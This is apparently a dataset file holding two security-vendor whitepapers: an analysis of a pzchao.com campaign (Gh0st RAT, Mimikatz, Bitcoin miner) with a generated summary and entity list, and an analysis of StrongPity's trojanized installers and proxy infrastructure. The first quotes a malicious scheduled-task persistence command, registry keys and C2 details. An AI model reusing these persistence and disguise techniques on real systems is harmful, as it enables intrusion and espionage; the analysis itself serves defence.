in Iron Tiger APT operation. Interestingly enough, these new samples now connect to the new attack infrastructure.This whitepaper takes an in-depth look at the the attack chain, the infrastructure used by the threat actors, the malware subdomains they control and the payloads delivered on the targeted systems, as well as other telltale signs about a possible return of the Iron Tiger APT.1. Victimology Since its debut, this malware has been targeting important institutions, mainly in Asia and the USA, the victims being part of Government sector, Technology, Education and Telecommunications. This map offers a simpliﬁ ed view of the location and nature of the targets.Technology Telecommunications[2]Whitepaper2. The attack chainThe initial point of compromise seems to be highly targeted spam messages with a malicious VBS ﬁ le attached. The VBS script acts as a downloader for further malicious payloads from a distribution server, as shown in the diagram below.The distribution server has been resolved to an IP address located in South Korea as of July 17 2017, when we ﬁ rst isolated the initial and executed on the compromised hosts in every stage of attack.2.1. Overview of the malware delivery infrastructureThe threat actors behind the attack have control over ﬁ ve subdomains of the “pzchao.com” domain. Suggestively named, these domains serve speciﬁ c functionalities, such as upload, download and RAT related communication.[3]Whitepaper2.2. The ﬁ rst stage payload – “UP”One sample we dug from the malware zoo has also been spotted in various regions in Asia. It consists of a self-extracting 7zip archive (SFX) which, when extracted, writes two batch scripts (up.bat, new.bat) to disk and one legitimate application called curl.exe.This payload is particular to Asia, as the messages that the SFX Install Script displays as part of the setup on the compromised system are written in Chinese. The malicious batch scripts, along with the downloader tool, are dropped in the %systemroot%\\temp folder. The ﬁ rst bat script to run is “up.bat” and is set in the “RunProgram” variable.2.2.1. A closer look at up.batThe install script in the self-extracting archive executes the ﬁ rst batch script dropped on the system. This script called “up.bat” sits in the temporary folder and serves four main purposes:-It renames the second batch script from tnew.bat to win32shell.bat;--Assigns system ﬁ le attributes to it;Modiﬁ es its Access Control List (ACL) to be easily controlled;- as well as legit security solutions like 360.;Kills all scheduled tasks that might interfere with the sample. Some of these tasks include legitimate Adobe services[4]WhitepaperThe new win32shell.bat script is subsequently scheduled to run as a task under the “Adobe Flash Updates” name every other day at 3 AM with the “down” parameter. The task name disguise helps keep a low proﬁ le and evade scrutiny in case of an investigation:schtasks /create /tn “Adobe Flash Updaters” /tr “%systemroot%\temp\win32shell.bat down” /sc daily /mo 2 /st 03:00:00 /ru “”2.2.2.new.batThe “new” batch script is used by the network’s operators as a downloader for additional companion tools, as well as to upload system information (and other conﬁ dential data) to a command and control server. The BAT ﬁ le is saved in the %TEMP% folder as “win32shell.bat”.2.2.3.The upload server component – “up.pzchao”During its execution, win32shell.bat contacts the command and control server at up.pzchao.com:864/install.asp? to send a ﬁ ngerprint of the system. The information is passed along in a POST request made by another batch script ﬁ le that is decrypted and dropped by win32. shell.bat. This dropped batch script is called “360.bat” (most likely because of its resemblance to a highly popular security suite in China) and sends information such as username, domain, MAC address, OS version and the RDP port 3389 status via a POST request to the / install.asp script. The request is sent via the legitimate application curl.exe that gets extracted from the initial 7zip archive.Once the script ﬁ nishes proﬁ ling the infected device, it starts uploading conﬁ dential information, such as passwords. Password achievement is done via a Mimikatz implementation downloaded along with the rest of the ﬁ les. This POST request containing the password is sent to another server-side script, called /upload864. This information is scheduled for collection and exﬁ ltration every week at 3 AM.[5]Whitepaper2.3. The Download Server – “down.pzchao”Win32shell.bat contacts the download server at “down.pzchao.com” to request the four additional second-stage payloads that are discussed in detail below.[6]Whitepaper2.3.1.Second stage payloadsThe Bitcoin MinerThe ﬁ rst payload deployed to the infected system is a self-extracting 7zip archive that drops a set of miner application tools for Bitcoin mining. The original installation batch script ensures that the miner application works well so that it will kill all scheduled tasks (other bitcoin mining applications) which may interfere with the running tool. Subsequently, it identiﬁ es the operating system used and sets the corresponding Bitcoin miner application into the %TEMP% system folder.The script proceeds to create a service called named wmiapsrv.exe that runs a BitcoinMinerPooling Application. The wmiapsrv32/64.exe is a fake application set as a service, which runs java. exe (the actual Bitcoin miner). The Bitcoin miner application (both 32-bit and 64-bit) is renamed as java.exe and used for bitcoin mining every three weeks at 3 AM.The Password StealerTo harvest passwords from the target system, the malware deploys two versions of the Mimikatz password-scraping utility for both operating system architectures (x86, x64). Mimikatz comes in a self-extracted 7zip archive also and, once extracted, it drops four distinct ﬁ les, called mimikatz.exe, mimilib.dll, mimidrv.sys, and pass.bat.The batch script executes the Mimikatz binary. Once dumped, the conﬁ dential information gets uploaded to the command and control server at a later time.The Remote Access Trojan component (Gh0st RAT)The last payload downloaded is a slightly modiﬁ ed Gh0st RAT sample designed to act as a backdoor implant. Its behavior is very similar to the versions detected in attacks associated with the Iron Tiger APT group. This executable represents the “dropper” - a Windows application that contains all the code required to prepare a compromised host for installation of the Gh0st RAT server service. The binary that is decrypted and dropped on the system is the same as the one that communicates with the attacker’s endpoint (also known as the RAT client or the C2 controller) on startup and awaits further instructions.[7]WhitepaperOnce this service is installed on the targeted host, the system is completely compromised, as it has a vast array of espionage capabilities (including Remote Terminal) that can be used to move laterally across the network. A list of main capabilities, along with a short description, are shown below in Table 1.Process Explorer Keystroke Logger Web Cam Eavesdropping Remote File Downloads Remote Terminal File ManagerListing of all active processes and opened windows Real-time and offline remote keystroke logging Live video feed of remote web camera, if available Remote listening using microphone if available Remote shutdown and reboot of host Ability to download binaries from the Internet to remote host Fully functional remote shell Complete ﬁ le explorer capabilities for local and remote hostsThe Gh0st architecture takes advantage of the ability to create custom Windows resources in a Windows binary. This mechanism is used quite often by malware authors, as it is extremely convenient for attackers to create custom binaries for different targets.Before installation of the main communication component, the dropper takes several actions on the infected system: it will ﬁ rst call the GetInputState() function that veriﬁ es if there are mouse or keyboard messages in the calling thread’s queue being followed by calls to PostThreadMessage() and GetMessage(). However, none of the return values of these called functions are processed, which is highly speciﬁ c to many of the versions of Gh0st RAT we have seen in the past.The malware then searches inside its own binary for a string delimiter SSSSSSS, returning a string pointer to the beginning of the encrypted conﬁ guration string. The delimiter points to the beginning of the C2 hostname:port pairs. The application searches again for another string delimiter AAAAAAA. This time the marker string points to the beginning of the encrypted server service name. If the conﬁ guration strings are not found, the application exits. The encrypted conﬁ gurations previously located will be decrypted using AES.It will then ensure that only one instance of the program runs at a given moment by checking for the presence of a particular mutex on the system. Subsequently, the payload enables its automatic execution upon every system startup by adding the path of the executable in the “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” registry key.It also registers itself as a system service by adding the following registry keys:“HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Wsfbpy sahblabg”“HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Maobeu xqiyes”“HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Wsfbpy sahblabgReleiceName = „Oracle.exe””“HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Wsfbpy sahblabg [8]WhitepaperReleiceName = „Maobeu xqiyes””“HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Maobeu xqiyesConnectGroup = „””“HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Maobeu xqiyesMarkTime = „2017-10-19 17:21”These steps that the dropper follows to install the RAT server are contained within a try-except block, which makes any potential error terminate the execution of the application.Along with the server binary dropped on the system, a Visual Basic script (“jingtisanmenxiachuanxiao.vbs”) that is used for process clean- up is also written in the current folder.The server’s binary gets extracted from its own resource section and is written to the \Windows\System32 folder with the name of the installed service (“Oracle.exe”).Finally, it calls StartService() to execute the second component , namely the RAT server that will have total control over the compromised host from now on. It starts to communicate with the C2 servers and await instructions.Until it checks in with its C2 controller, the RAT server searches for the encrypted conﬁ guration buffer containing the C&Cs that will get decrypted using an AES key derived from a hardcoded string “Mother360”. The C&C servers revealed after decryption are:rat.pzchao.com – used for sending instructionscenturiosa.info – used for sending instructionszl855.no-ip.info – used for requesting new conﬁ guration ﬁ le of the C2 serversIt will then set a Windows station, ﬁ rst by saving the current station by calling GetProcessWindowStation() then creating a new one named winsta0 by calling OpenWindowStation(). This happens because, according to MSDN, “Kernel objects are securable, while user objects and GDI objects are not. Therefore, in order to provide additional security, user interface objects are managed using window stations and desktops, which themselves are securable objects.”. It veriﬁ es if an instance of this service is already running by checking if a global instance variable is not “null”.Next, the RAT calls a function that uses the decrypted conﬁ guration data to populate the following ﬁ elds: lpszHost, dwPort, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass. If the proxy variables exist and are being populated, the socket used to connect to the C2 RAT client gets conﬁ gured to use the PROXY_SOCKS conﬁ g. To determine how long the server has been connected to the client, the return value of the function GetTickCount() gets saved. The ﬁ rst check-in to the client consists of a login token (TOKEN_LOGIN) that is followed by the data encapsulated in a “LOGINDATA” structure. The attacker uses this initial information as a ﬁ ngerprint of the system, which proves extremely useful in determining the importance of the infected target and its potential role on the network.[9]WhitepaperOnce the attacker receives the ﬁ ngerprint packet, it is decrypted and parsed. A new row is then added to the Connections tab grid of the client interface and the details of the server host are populated in the appropriate ﬁ elds. The number of active connections displayed on the Connections tab grid status bar is incremented by 1.Once the handshake is completed successfully with the client (C2), the RAT waits for commands. When a user of the C2 client needs to perform an action on a server from a compromised host, a Command packet containing the highlighted capabilities is created and sent.Another trick that helps the malware fly below the radar is to change the C2 address to localhost when the attacker is not using the infrastructure.The network communication between the Gh0st RAT C2 client and a compromised host (server) is AES encrypted using the same string “Mother360” to derive the decryption key. The packets passed between the two endpoints consist of two ﬁ elds, but lack the plaintext header that was typical of Gh0st RAT in previous versions:1. A four-byte integer that contains the size in bytes of the entire packet.2. A variable-sized packet that contains the packet payload AES encrypted.The client sends small requests - packets containing commands - and the server responds to those commands with the requested data.The two endpoints communicate using a series of pre-deﬁ ned commands. After the four byte integer that represents the size, the ﬁ rst byte of the packet payload contains an operation code. There are three types of codes: Commands, Tokens, and Modes. In the source code, these codes are contained in a large enum in a header ﬁ le.Command codes are sent by the attacker instructing the victim what to do. Examples:COMMAND_WEBCAMCOMMAND_SCREEN_SPYCOMMAND_KEYBOARD[10]WhitepaperCOMMAND_AUDIOCOMMAND_SCREEN_BLOCK_INPUTCOMMAND_PSLISTToken codes that are passed between the two endpoints to ensure a clear protocol of the data being sent. Examples:TOKEN_LOGINTOKEN_DRIVE_LISTTOKEN_FILE_LISTTOKEN_FIRST_SCREENTOKEN_AUDIO_DATAMode codes are used to determine in what circumstances the actions will be executed and to respond to speciﬁ c action settings accordingly. Examples:TRANSFER_MODE_NORMALTRANSFER_MODE_UPDATETRANSFER_MODE_CANCELAll these capabilities leave no doubt about the tool’s initial purpose and reach into the compromised device. It allows a remote attacker to take full control of the system, spy on the victims and exﬁ ltrate conﬁ dential information easily.3.The malware hosting infrastructure3.1. The HTTP File ServerWhile analyzing the download URL down.pzchao.com , we realized that it runs on a HTTP ﬁ le server and we managed to obtain a list of all ﬁ les hosted on it, including meta-information such as last modiﬁ cation timestamps and number of downloads. A partial list of ﬁ les and the number of hits can be seen in the image below:[11]WhitepaperAnother interesting aspect is that attackers often reset the download counters along with the IP Logs that keep a record of the targeted victims of different campaigns. As shown in the hit log above, the most-downloaded malicious modules are the SFX installer and the Gh0st RAT backdoor. The statistics also show that the number of hits (and implicitly, the number of victims) is constantly increasing, as per the graphic below:3.1.1.BackdoorsThe malware server also hosts ﬁ ve payloads that act as backdoors on the targeted systems. All ﬁ ve payloads are versions of the Gh0st RAT tool. Two of these (8060.exe and 8555-.exe) communicate with the same main C&C server rat.pzchao.com. What differs is that the packets exchanged between the client and the server begin with a plaintext header “Spidern”, followed by the data packet that is compressed using zlib.The other two samples (9527.exe and 8555++.exe) communicate with other two servers that are part of the infrastructure dll.pzchao. com ; 455.pzchao.com. These versions will download the RAT server from dll.pzchao.com.[12]Whitepaper3.1.2. YPratThe download server also contains a Remote Access Trojan developed in Python (both client and server). This server is used to listen for connections on the same IP but on a different port (444). Our analysis revealed that it has extra features, such as downloading and uploading ﬁ les on remote infected systems, as well as information harvesting. Judging by the small number of downloads, we presume that this payload is currently undergoing testing.3.1.3Port Scanning ToolsAnother category of tools hosted on the same server is port scanning applications, complemented by a set of IP logs passed as an argument to the scanning tools. These logs feature a range of subnets, mainly located in Asia. They are contained within the IP logs, which means that, prior to an infection, the attackers ﬁ rst search for vulnerabilities to exploit on the targeted systems.ConclusionsEven though the tools used in this particular attack are a few years old, they are battle-tested and more than suitable for future attacks. The ability to download most of these for free on certain underground hacking forums decreases the cost of attack without compromising on stealth or effectiveness. Usually, threat actors are constantly modifying these tools to make them suitable for their targets they have in their crosshairs: governments or strategic institutions such as education, telecommunication and so on.As described in this paper, this remote access Torjan’s espionage capabilities and extensive intelligence harvesting from victims turns it into an extremely powerful tool that is very difﬁ cult to identify. The C&C rotation during the Trojan’s lifecycle also helps evade detection at B-iBitdefender is a global security technology company that provides cutting edge end-to-end cyber security solutions and advanced threat protection to more than 500 million users in more than 150 countries. Since 2001, Bitdefender has consistently produced award-winning business and consumer security technology, and is a provider of choice in both hybrid infrastructure security and endpoint protection. Through R&D, alliances and partnerships, Bitdefender is trusted to be ahead and deliver robust security you can rely on. More information is available at url bitdefender.com.© 2018 Bitdefender. All rights reserved. All trademarks, trade names, and products referenced herein are property of their respective owners. FOR MORE INFORMATION VISIT: bitdefender.com/business "," 1. Attackers send targeted spam messages with a VBS downloader script attached. 2. The VBS script fetches additional payloads from the distribution server down.pzchao.com. 3. The payloads include a Bitcoin miner, Mimikatz, and Gh0st RAT backdoor. 4. Gh0st RAT communicates with command servers rat.pzchao.com and centuriosa.info for control. 5. The implanted RAT can perform extensive surveillance through capabilities like keylogging, webcam access, file downloads, etc. 6. Separate scripts exfiltrate data like passwords back to the C2 at up.pzchao.com. 7. The RAT can also download updated configurations and payloads from the infrastructure. ",valid_65,"['attackers', 'end', 'targeted spam messages', 'The VBS script', 'the distribution server', 'down.pzchao.com', 'The payloads', 'Bitcoin', 'Mimikatz', 'Gh0st RAT backdoor', 'Command', 'centuriosa.info', 'control', 'capabilities', 'access', 'file downloads', 'passwords', 'the C2', 'up.pzchao.com', 'the RAT', 'the infrastructure']",attackers; end; targeted spam messages; The VBS script; the distribution server; down.pzchao.com; The payloads; Bitcoin; Mimikatz; Gh0st RAT backdoor; Command; centuriosa.info; control; capabilities; access; file downloads; passwords; the C2; up.pzchao.com; the RAT; the infrastructure.
"WHITEPAPERSecurity StrongPity APT - Revealing Trojanized Tools, Working Hours and InfrastructureContents Overview 3Key Findings: 3Infrastructure 3Download Servers 3Trojanized installers 4The download server 5Command and Control Servers 6First layer 6Second layer 6Components and Communication Protocol 8 Victims 9Mitre Matrix TTPs 10Appendix 11Author: Radu Tudorica – Security Researcher, Cyber Threat Intelligence Lab Co-authors: Cristina Vatamanu - Senior Team Lead, Cyber Threat Intelligence Lab Alexandru Maximciuc - Team Lead, Cyber Threat Intelligence LabOverviewKey Findings:StrongPity, also known as Promethium, is a threat group that is assumed to have been active since at least 2012. Information about this actor was first publicly reported in October 2016 with details on attacks against users in Belgium and Italy. Later, in 2018, the attackers shifted their focus on another geographical region, compromising Turkish telecommunication companies to target hundreds of users in Turkey and Syria.It is believed that the attacks attributed to StrongPity are government-sponsored and are used for population surveillance and intelligence exfiltration. More so, it is believed that these attacks are used as support for the geo-political conflicts in the region. The known preferred infection vector used by the StrongPity group is a watering hole technique, delivering malicious versions of legitimate installers to certain targets.By closely monitoring this threat, Bitdefender has managed to investigate it from several angles. Besides the technical setups of command and control servers, our researchers managed to get an insight into the victims’ profile.Most of the targets are located in two regions in Turkey: in Istanbul and the area close to the Syrian border.The data we have gathered in the investigation into this threat actor suggests that the attacker is interested especially in the Kurdish community, placing this threat in the geo-political context of the constant conflicts between Turkey and the Kurdish community.• Watering hole tactic that selectively targets victimsin Turkey and Syria using pre-defined IP list• 3-tiered C&C infrastructure for covering tracks andthwarting forensic investigation• Use of fully-working Trojanized popular tools,compiled during working hoursInfrastructureDuring the time we closely monitored this threat actor and investigated different points from their infrastructure, we were able to distinguish two types of servers, used to fulfill two main roles:• Servers that will serve the poisoned installer used inthe initial compromise (referred from this point on as Download Servers)• Servers used for exfiltrating information and for interacting with the victim through commands (referred from this point on as Command and Control Servers)Some particularities for each of these types will be detailed below.Download ServersAs mentioned before, one of the preferred infection mechanisms is a watering hole technique. In this type of attack, the threat actor will make use of certain websites that the victim often visits. For what was observed in the wild, StrongPity actors were able to tamper some localized software aggregates and sharers.Usually, website visitors, when trying to download a certain installer, are redirected to a dedicated download server, as a result of a rewritten request to the legitimate server. If a user is of interest to the threat actor (his/her IP address is within one of the ranges it targets), the server will return the tampered version of that installer. Otherwise, the user will receive the original version of it.The servers where the targeted users are redirected are referred as the download servers.3Bitdefender Whitepaper StrongPity APT - Revealing Trojanized Tools, Working Hours and InfrastructureTrojanized installersThe malicious installers, which are served to the targeted victims, are quite interesting. The actor uses a custom bundler/dropper, digitally signed (with a self-signed certificate), that embodies the malicious components and the original, legit software product. But these initial droppers are very different, even if they are generated immediately one from another. The encryption key for the components changes from one installer to other, although they tend to have the same key length for each campaign.During our investigation, we were able to gather several samples of these tampered installers. The affected applications fall into several categories, such as application for compression like 7-zip and WinRAR archiver, security software such as McAfee Security Scan Plus, file recovery application - Recuva, application for remote connection such as TeamViewer, chat application such as WhatsApp or different tools and utilities like Piriform CCleaner, CleverFiles Disk Drill, DAEMON Tools Lite, Glary Utilities, or RAR Password Unlocker, covering a wide range of needs.Each initial dropper has a compile time, the exact date the tampered installer was created. When we investigated this aspect, we observed that all the files we managed to retrieve were compiled from Monday to Friday, a normal work week. Another interesting aspect is that the time interval for these timestamps is around 9 hours, which is a workday norm. If we were to place this norm in a 9 to 6 working schedule the time zone would be UTC+2.4The above observation strengthens the idea that this threat is sponsored, and we are dealing with an organized developer team paid to work for this “project”.The download serverWhile monitoring the threat actor activity, we were able to investigate several points from the infrastructure.The download servers had some interesting particularities.The actor has taken some security measures in order to ensure that only the “right” connections are accepted.They use a helper script (self-named “Debian Stretch Hardening Script”) with the following help message:usage: $0 options Debian Stretch Hardening Script OPTIONS: -u Admin User -p SSH Port -k SSH Public Key (example : “ssh-rsa AAA ”) -d Domain Name -n Knock Ports (example : 10001,10002,10003,10004) --helpHelpThe script, among other actions, updates all the packages, creates the “admin user” on the system (and computes the password for it, based on the Knock ports and SSH port), configures nginx and configures knockd service and the firewall. Due to an error in the script, the password is always the same. This does not represent a problem because the SSH daemon is configured to only allow public key authentication.In one instance, the actor used a sequence of four Knock Ports when calling the script.Interestingly, there seems to be a specific IP from Israel that is denied any connection to the download server, an IP address which seems to belong to an important science university.Reviewing the software logic, we identified 2 directories with malicious binary files and 3 PHP scripts:1. configuration.php – contains the locations of those 2 directories and a list named $targets (which should contain alist of IP ranges, but it is empty) and a mapping from 32 hex-digits to filename (which does not represent the md5 hash of the file, but uniquely identifies it- referenced from now on as file-id). • •read.php – contains two functions: checkUserIP() which checks if an IP address is contained in the $targets list2. serveFile() – serve an installer file to the client 3. inject.php – the main logic. It Includes the other 2 php files, validates that the IP of the connecting client is amongthe targets list defined in configuration.php, checks the file-id and serves the chosen file.According to the logic of the scripts, one of the directories should contain the original installers and the other the tampered ones. If the IP address of the victim is in the $targets list, a trojanized installer would be delivered, otherwise a legitimate one would be served. In the case of the nodes we investigated, both directories contained the exact same files and the $targets list was empty, meaning that any valid connection would get the malicious installer.In the wild, we have seen the requests for the first layer of the following pattern:5Bitdefender Whitepaper StrongPity APT - Revealing Trojanized Tools, Working Hours and Infrastructureurl server>/<8 character folder>/<the 32 hex-digits that identify the file> But, in the nodes that we have analyzed, a valid URL would have the form:url server>/<8 character folder>/<the inject.php file>?params=<the 32 hex digits that identifies the file>. This discrepancy points to either the nodes being out of use, or, the known URL scheme being changed.Any other requests are redirected to url and Control ServersOnce the malicious installer is downloaded and executed, the backdoor is installed. The backdoor will communicate with a command and control server, embedded into its binary, for document exfiltration and for retrieving commands to be executed, depending on the importance of the victim. From an OPSEC point of view, the actor takes different actions in order to hide and anonymize its traces. The C2 network uses a set of proxy servers to hide the terminal node/nodes in the infrastructure. At the moment of writing, we have identified at least three layers in this infrastructure.First layerThe first layer is made up of IPs to which the malware will try to connect. Each of these IPs has a unique domain associated to it that is embedded in the binary. These are in fact proxies to other machines.The nodes we have seen use the PHP curl bindings to forward the request to the next server in the chain they know (one script for file exfiltration and one script for retrieving commands). If a node is compromised, one could not have details about the entire infrastructure, knowing only about the nodes before it and the node it submits data to.The first layer does some basic validation and forwards the traffic to and from another server, which usually is located in a different country, at a different provider. The communication between the first layer and its upstream is HTTPS (the certificate is not verified) on an unusual TCP port for this protocol – 1402.As for the software stack, nginx and php are used and configured to respond with 404 to all incorrect requests (either non-existing files, for which nginx serves the 404 response or for incorrect parameters to the PHP scripts, which falls into the php script’s responsibility to serve the 404 code).Second layerThe second layer is composed of the IP addresses that the first layer forwards data to. These IPs do not seem to have any domains linked to them and have multiple first layer IPs pointing to them. Other writeups mention the PHP scripts goN9Z2In7mYQmN92dzX11CQL.php (for file upload) and p5Pss34GvX21pxO0bz25vLqU.php (for getting the commands). These PHP files still exist in the whole infrastructure, but they now reside on the 2nd layer proxy, with the 1st layer/public facing script being named info. phpor phpinfo.php (for file uploads) and ini.php or parse_ini_file.php (for the commands). The table below illustrates the names of these PHP scripts our researchers retrieved during the investigation on each layer from the infrastructure:61st layer2nd layer 25vLqU.phpinfo.php Both the first and second layers have the SSH daemon configured to listen on a high port (bigger than 1024). By avoiding the use of the default port for a certain protocol, the threat actors are trying to ”stay under the radar” from common Internet scanners and search engines like Shodan or Censys.Z3@Pp6!8nb7T5pUP_=wAsr- r2tKTZdf4=gp.php3rd layer WNpRAq-yeVPQ@.phpFunctionality file uploadGet commandsAs far as our researchers were able to investigate, the threat actors use a VPN service for connecting and administrating the servers , usually from secureconnect.me or torguardvpnaccess.com.The figure below summarizes the communication between the proxy layers after an infection was performed:In terms of infrastructure, we were able to map 47 servers with different functionalities. It does not seem that the threat actor prefers a particular hosting provider or region to set up the infrastructure, but most of them are in Europe.7Bitdefender Whitepaper StrongPity APT - Revealing Trojanized Tools, Working Hours and InfrastructureComponents and Communication ProtocolOnce the tampered installer is downloaded and executed, it will drop 4 files: the Legit Setup, the Launcher and Persistence component, the Exfiltration and Command Execution component and the File Searcher component.The first executed file is the original installer, which will be prompted to the user so that they would not suspect anything. All malicious actions are performed in the background.All of these 4 components are encrypted in the resource section of the initial dropper. Each resource has an 8-byte header that tells the dropper the size of the executable and the component type.A summary of the installation process is illustrated in the figure below:After the Launcher component is dropped into the %SYSTEM% folder, it is executed by calling the function responsible for creating a new service. The name of the service is a common one, either replacing a non-vital system service (Print Spooler) or having a name that does not raise any suspicions (Registry Maintenance Server). The service will be used as a persistence mechanism and will execute the Launcher component.The dropper starts the service and will drop the rest of the executables.The Launcher component executes the Exfiltration and Command Execution component, usually placed in the same system folder, and waits for an uninstall event.The Exfiltration component is responsible for running the File Searcher component and for exfiltrating the files to the C&C server through a POST request. It regularly asks the C&C server for download and execution commands or an uninstall command. The last one, if received, will be sent as an event to the Launcher component. The get_command is sent as POST request with an argument called name that contains a tag. This tag is used as a form of authentication and is influenced by the compilation time of the file. In our tests, the servers always seem to respond with a 404 if asked for a command.The File Searcher component loops through every drive and looks for files with certain extensions. The malicious binary has an extension list embedded (usually identifying different types of documents). If a file with an extension from that list is found, it will be copied into a temporary zip archive. After completing adding the files to the archive, it will split it8into hidden .sft encrypted files. The .sft files are read by the Exfiltration component, sent to the C&C server and deleted from the disk.After the exfiltration process is completed, the Exfiltration component will wait for further commands as described above.As mentioned earlier, the files that will be exfiltrated are first copied into a zip file. This zip file will be encrypted into multiple .sft files as follows:• The File Searcher component will read 2048 bytes from the zip file • For each byte it will apply a xor operation between the least significant 4 bits and the most significant 4 bits and itwill write the result in the .sft file• The first two steps are repeated a maximum of 53 times • • For each zip file, the first .sft file will have a N prepended as a first character, the rest of the .sft files which completeIf the zip file still has unprocessed data, a new .sft file will be createdan archive will have an O prepended.VictimsWhile screening the victims it was obvious that this threat is an extremely targeted one. The majority of victims are concentrated in the area of Turkey and Syria.Zooming in, we were able to observe that most of the targets are located near the border between Turkey and Syria, as well as in Istanbul, enforcing the idea that this threat might be involved in the geo-political conflict between Turkey and the Kurdish community.9Bitdefender Whitepaper StrongPity APT - Revealing Trojanized Tools, Working Hours and InfrastructureMitre Matrix TTPsls 2/23/18 14:45 2/23/18 14:45 2/23/18 14:45 2/23/18 14:45 2/23/18 14:45 2/23/18 14:45 2/23/18 14:45 3/27/18 7:45 3/27/18 7:47 3/27/18 7:48 3/27/18 7:52 3/27/18 7:55 3/27/18 7:56 3/27/18 8:21 4/9/18 12:41 4/9/18 12:41 4/9/18 12:41 4/9/18 12:42 4/9/18 12:44 4/9/18 12:46 4/9/18 12:46 5/15/18 13:58 5/15/18 13:58 5/15/18 13:58 5/15/18 13:59 5/15/18 13:59 5/15/18 13:59 5/15/18 13:59 5/15/18 13:59 5/15/18 13:59 5/15/18 14:00 5/15/18 14:00 5/15/18 14:00 5/15/18 14:00 5/15/18 14:02 5/15/18 14:03 5/15/18 14:03 5/15/18 14:04 5/15/18 14:04 5/15/18 14:04 5/15/18 14:04 5/15/18 14:04 5/15/18 14:04 5/15/18 14:08 5/15/18 14:10 5/15/18 14:10 5/15/18 14:13 5/15/18 14:14 5/15/18 14:14 5/15/18 14:14 5/15/18 14:21 5/15/18 14:21 5/15/18 14:37 5/15/18 14:37 5/15/18 14:40 5/15/18 14:41 5/15/18 14:41 5/15/18 14:41 5/15/18 14:41 5/15/18 14:41 5/15/18 14:45Hash StrongPity APT - Revealing Trojanized Tools, Working Hours and InfrastructureCompile time 5/15/18 14:45 5/15/18 14:49 5/15/18 14:49 5/15/18 14:50 5/15/18 14:50 5/15/18 14:50 5/15/18 14:50 5/15/18 14:50 7/16/18 15:02 7/16/18 15:02 7/16/18 15:02 7/16/18 15:05 7/16/18 15:05 7/16/18 15:07 7/16/18 15:07 7/16/18 15:07 7/16/18 15:07 7/16/18 15:22 7/16/18 15:22 7/16/18 15:23 7/16/18 15:23 7/16/18 15:23 7/16/18 15:23 7/16/18 15:25 7/16/18 15:26 7/16/18 15:27 7/16/18 15:28 7/16/18 15:28 7/16/18 15:28 7/16/18 15:29 7/16/18 15:29 7/16/18 15:33 7/16/18 15:41 7/16/18 15:41 7/16/18 15:41 7/16/18 15:41 7/16/18 15:41 7/16/18 15:43 7/16/18 15:43 7/16/18 15:43 7/16/18 15:46 7/16/18 15:48 7/16/18 15:48 7/16/18 15:54 7/16/18 15:55 7/16/18 15:59 7/16/18 16:13 10/22/18 9:08 10/22/18 9:08 10/22/18 9:08 10/22/18 9:09 10/22/18 9:14 10/22/18 9:17 10/22/18 9:17 10/22/18 9:20 10/22/18 9:20 10/22/18 9:22 10/22/18 9:22 12/17/18 15:44 12/17/18 15:44 12/17/18 15:44 12/17/18 15:44 12/17/18 15:46 12/17/18 15:46 12/17/18 15:46 12/17/18 15:47 12/17/18 15:47 12/17/18 15:51 12/17/18 15:51 12/17/18 15:51 12/17/18 16:09 12/17/18 16:09 12/17/18 16:18 12/17/18 16:18 12/17/18 16:18 2/4/19 10:15 2/4/19 10:15 2/4/19 10:15 2/4/19 10:15 2/4/19 10:17 2/4/19 10:17 2/4/19 10:17 2/4/19 10:18 2/4/19 10:18 2/4/19 10:19 2/4/19 10:19 2/4/19 10:21 2/4/19 10:21 2/4/19 10:21 2/4/19 10:21 2/4/19 10:21 2/4/19 10:21 2/4/19 10:21 2/4/19 10:21 2/4/19 10:21 2/4/19 10:26 2/4/19 10:26 2/4/19 10:26 2/4/19 10:42 2/4/19 10:42 2/4/19 10:42 2/4/19 10:43 2/4/19 10:43 2/4/19 10:45 2/4/19 10:45 2/4/19 10:47 2/4/19 10:49 2/4/19 10:49 2/4/19 10:50 2/4/19 10:50 2/4/19 10:50 2/4/19 10:50 2/4/19 10:50 2/4/19 10:54 2/4/19 10:54 2/4/19 10:54 2/4/19 10:54 2/4/19 11:22 2/4/19 11:22 2/4/19 11:26 2/4/19 11:26 5/21/19 13:55 5/21/19 13:55 5/21/19 13:56 5/21/19 13:56 5/21/19 13:56 5/21/19 13:58 5/21/19 13:58 5/21/19 14:00 5/21/19 14:02 5/21/19 14:02 5/21/19 14:02Hash StrongPity APT - Revealing Trojanized Tools, Working Hours and InfrastructureCompile time 5/21/19 14:02 5/21/19 14:02 5/21/19 14:06 5/21/19 14:06 5/21/19 14:23 5/21/19 14:24 5/21/19 14:24 5/21/19 14:24 5/21/19 14:26 5/21/19 14:26 5/21/19 14:26 5/21/19 14:31 5/21/19 14:31 5/21/19 14:32 5/21/19 14:32 5/21/19 14:35 5/21/19 14:35 5/21/19 14:35 5/21/19 14:38 9/18/19 9:51 9/27/19 11:52 10/1/19 13:40 10/1/19 13:41 10/1/19 13:41 10/1/19 13:41 10/1/19 13:43 10/1/19 13:44 10/1/19 13:45 10/1/19 13:46 10/1/19 13:46 10/1/19 13:46 10/1/19 13:47 10/1/19 13:47 10/1/19 13:47 10/1/19 13:48 10/1/19 13:48 10/1/19 13:49 10/1/19 13:49 10/1/19 13:50 10/1/19 13:51 10/1/19 13:52 10/1/19 13:52 10/1/19 13:53 10/1/19 13:53 10/1/19 13:54 10/1/19 13:55 10/1/19 13:56 10/1/19 13:56 10/1/19 13:56 10/1/19 13:57 10/1/19 13:57 10/1/19 13:57 10/1/19 13:57 10/1/19 13:58 10/1/19 13:59 10/1/19 14:00 10/1/19 14:01 10/1/19 14:02 10/1/19 14:02 10/1/19 14:02 10/1/19 14:02 10/1/19 14:03 10/1/19 14:03 10/1/19 14:03 10/1/19 14:03 10/1/19 14:04 10/1/19 14:05 10/1/19 14:05 10/1/19 14:05 10/1/19 14:05 10/1/19 14:06 10/1/19 14:06 10/1/19 14:06 10/1/19 14:07 10/1/19 14:07 10/1/19 14:09 10/1/19 14:10 10/1/19 14:10 10/1/19 14:10 10/1/19 14:11 10/1/19 14:11 10/1/19 14:11 10/1/19 